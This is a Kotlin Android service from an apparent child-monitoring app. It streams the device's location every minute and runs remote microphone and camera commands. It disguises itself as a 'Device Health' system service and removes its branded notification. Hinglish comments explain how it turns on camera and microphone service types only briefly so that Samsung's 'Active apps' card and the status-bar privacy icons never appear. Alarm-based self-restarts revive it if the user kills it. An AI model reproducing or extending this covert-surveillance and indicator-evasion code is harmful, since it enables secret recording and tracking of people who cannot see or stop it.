package com.familyguard.child.service

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.os.BatteryManager
import android.os.IBinder
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import com.familyguard.child.R
import com.familyguard.child.RulesEngine
import com.familyguard.child.data.Api
import com.familyguard.child.data.Store
import com.familyguard.child.util.AgeRelease
import com.familyguard.child.util.CommandHandler
import com.familyguard.child.util.SelfHeal
import com.google.gson.JsonObject
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlin.coroutines.coroutineContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class MainService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)

    /** Internet wapas aane par ws ko turant jodne wala callback (unregister onDestroy me). */
    private var netCb: ConnectivityManager.NetworkCallback? = null

    companion object {
        /** True while the foreground service is alive; used by the SelfHeal watchdog. */
        @Volatile
        var running: Boolean = false

        /** Last statusLoop tick (elapsedRealtime); lets others detect a wedged service. */
        @Volatile
        var lastBeat: Long = 0L

        @Volatile
        var instance: MainService? = null

        /** Samsung One UI ka "Active apps" card ("1 app active — Device Health")
         *  tabhi banta hai jab FGS me camera/microphone type chalu ho. Isliye ab
         *  ham rest par sirf dataSync|location rakhte hain — mic/camera type sirf
         *  tab upgrade karte hain jab audio/camera SACH ME use ho raha ho, aur kaam
         *  karte hi wapas downgrade. Card + status-bar privacy icons dono isse
         *  root se gay. Yahan na ho to no-op (service alag process me mar chuki). */
        fun updateTypes(withMic: Boolean, withCam: Boolean) {
            val svc = instance ?: return
            runCatching { svc.reapplyTypes(withMic, withCam) }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        running = true
        lastBeat = SystemClock.elapsedRealtime()
        instance = this
        ensureChannel()
        // REST types: sirf dataSync|location. Camera/microphone type YAHAN kabhi
        // nahi — Android 14/15 par background start me in types ke saath
        // startForeground SecurityException deta hai (fallback dataSync-only par
        // mic phir bhi while-in-use ke karan silent), aur Samsung Device Care
        // in types dekh kar "Active apps" card ("1 app active") post karta rehta
        // hai. Mic/camera ab ForegroundPokeActivity upgrade karta hai jab zaroorat
        // ho (CommandHandler audio_start/camera) aur kaam karte hi downgrade.
        val notif = buildNotif("Device Health active")
        runCatching {
            ServiceCompat.startForeground(
                this, 1, notif,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        }.onFailure {
            runCatching {
                ServiceCompat.startForeground(this, 1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            }
        }

        if (AgeRelease.shouldRelease(this)) {
            AgeRelease.releaseAll(this)
            stopSelf()
            return
        }

        WsChild.connect()

        // Self-re-arming 2-min watchdog alarm — recent-clear / OEM kill ke baad
        // bhi app khud uth jati hai (alarm system-side hota hai, process ke
        // marne par bhi zinda rehta hai).
        SelfHeal.scheduleWatchdog(this)

        // WiFi <-> mobile data switch ya internet drop wapas aane par turant
        // reconnect — backoff loop ka wait nahi. Half-open link WsChild ke
        // pingInterval se pakda jata hai; ye callback healthy-network case hai.
        runCatching {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val cb = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    WsChild.connect()
                }
            }
            cm.registerDefaultNetworkCallback(cb)
            netCb = cb
        }

        scope.launch {
            WsChild.rulesFlow.collect { r -> r?.let { RulesEngine.update(it) } }
        }
        scope.launch {
            WsChild.fencesFlow.collect { f -> GeofenceChecker.update(f) }
        }
        scope.launch { locationLoop() }
        scope.launch { statusLoop() }
        scope.launch { persistLoop() }
        scope.launch {
            WsChild.commands.collect { cmd ->
                val (ok, data) = CommandHandler.execute(applicationContext, cmd)
                val out = JsonObject()
                out.addProperty("type", "command_result")
                out.addProperty("id", cmd.get("id")?.takeIf { it.isJsonPrimitive }?.asString ?: "")
                out.addProperty("ok", ok)
                out.add("data", data)
                WsChild.send(out.toString())
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onTaskRemoved(rootIntent: Intent?) {
        runCatching {
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val pi = PendingIntent.getForegroundService(
                this, 101, Intent(this, MainService::class.java),
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 2000, pi)
        }
        super.onTaskRemoved(rootIntent)
    }

    /** startForeground dobara call karke types upgrade/downgrade karo (Android 14+
     *  ka blessed pattern: "call startForeground() again and add the new types").
     *  Mic/cam sirf tab include karo jab permission sach me granted ho, warna
     *  system SecurityException dega — runCatching me safe hai. */
    private fun reapplyTypes(withMic: Boolean, withCam: Boolean) {
        var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        if (withCam && ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }
        if (withMic && ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        }
        runCatching {
            ServiceCompat.startForeground(this, 1, buildNotif("Device Health active"), types)
        }
    }

    override fun onDestroy() {
        running = false
        instance = null
        runCatching {
            netCb?.let {
                (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager).unregisterNetworkCallback(it)
            }
        }
        netCb = null
        WsChild.disconnect()
        // Self-heal: if the system (or the child) killed this service while still
        // paired and not released, schedule an automatic restart 3 s from now.
        // The exact alarm puts the app on the temporary allowlist, so the
        // foreground-service start is legal even from the background.
        if (Store.paired && !Store.released) {
            runCatching {
                val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val pi = PendingIntent.getForegroundService(
                    this, 102, Intent(this, MainService::class.java),
                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                )
                am.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 3000, pi
                )
            }
        }
        super.onDestroy()
    }

    // ------------------------------------------------------------- loops

    private suspend fun locationLoop() {
        while (coroutineContext.isActive) {
            runCatching {
                val fix = Locator.getCurrent(this@MainService)
                if (fix != null) {
                    runCatching { Api.postLocation(fix.lat, fix.lng, fix.accuracy, fix.speed, fix.battery) }
                    val m = JsonObject()
                    m.addProperty("type", "location")
                    m.addProperty("lat", fix.lat)
                    m.addProperty("lng", fix.lng)
                    m.addProperty("accuracy", fix.accuracy)
                    m.addProperty("speed", fix.speed)
                    m.addProperty("battery", fix.battery)
                    WsChild.send(m.toString())
                    GeofenceChecker.check(fix)
                }
            }
            delay(60_000)
        }
    }

    private suspend fun statusLoop() {
        while (coroutineContext.isActive) {
            delay(60_000)
            lastBeat = SystemClock.elapsedRealtime()
            runCatching {
                val m = JsonObject()
                m.addProperty("type", "status")
                m.addProperty("battery", batteryLevel())
                m.addProperty("charging", isCharging())
                m.addProperty("currentApp", EnforcementService.lastApp)
                m.add("health", SelfHeal.healthReport(this@MainService))
                WsChild.send(m.toString())
            }
        }
    }

    private suspend fun persistLoop() {
        while (coroutineContext.isActive) {
            delay(300_000)
            runCatching { EnforcementService.persist(this@MainService) }
        }
    }

    // ---------------------------------------------------------- battery

    private fun batteryLevel(): Int {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val prop = runCatching { bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) }.getOrDefault(-1)
        if (prop in 0..100) return prop
        val sticky = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return -1
        val level = sticky.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = sticky.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        return if (level >= 0 && scale > 0) level * 100 / scale else -1
    }

    private fun isCharging(): Boolean {
        val sticky = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return false
        val status = sticky.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        return status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
    }

    // ------------------------------------------------------------- notif

    private fun ensureChannel() {
        runCatching {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.deleteNotificationChannel("fg_service") // purana branded channel hatao
            nm.createNotificationChannel(NotificationChannel("dh_service", "Device Health", NotificationManager.IMPORTANCE_MIN))
        }
    }

    private fun buildNotif(title: String): Notification {
        ensureChannel()
        return NotificationCompat.Builder(this, "dh_service")
            .setSmallIcon(R.drawable.ic_app)
            .setContentTitle(title)
            .setContentText("System service running")
            .setOngoing(true)
            .build()
    }
}
